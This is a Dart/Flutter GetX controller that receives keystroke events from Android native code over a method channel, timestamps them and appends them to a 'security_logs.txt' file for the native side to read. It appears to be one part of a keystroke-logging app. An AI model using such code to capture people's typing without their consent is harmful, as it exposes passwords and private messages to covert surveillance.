import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:get/get.dart';
import 'package:path_provider/path_provider.dart';

class LoggerController extends GetxController {
  // matches the channel name in your Android native code
  static const platform = MethodChannel('com.example.app/events');

  var logs = <String>[].obs;

  @override
  void onInit() {
    super.onInit();
    _initMethodChannel();
  }

  void _initMethodChannel() {
    platform.setMethodCallHandler((call) async {
      if (call.method == "onKeyStroke") {
        String entry = "${DateTime.now()}: ${call.arguments}";

        logs.insert(0, entry);

        await _saveToFile(entry);
      }
    });
  }

  // appends logs to the shared file.
  // kotlin reads this exact file from the app's internal directory.
  // inside LoggerController.dart
  Future<void> _saveToFile(String text) async {
    try {
      final directory = await getApplicationSupportDirectory();

      // use a path that Kotlin definitely sees:
      final path =
          "${directory.path.replaceFirst('app_flutter', 'files')}/security_logs.txt";
      final file = File(path);

      await file.writeAsString('$text\n', mode: FileMode.append);
    } catch (e) {
      debugPrint("File Save Error: $e");
    }
  }
}
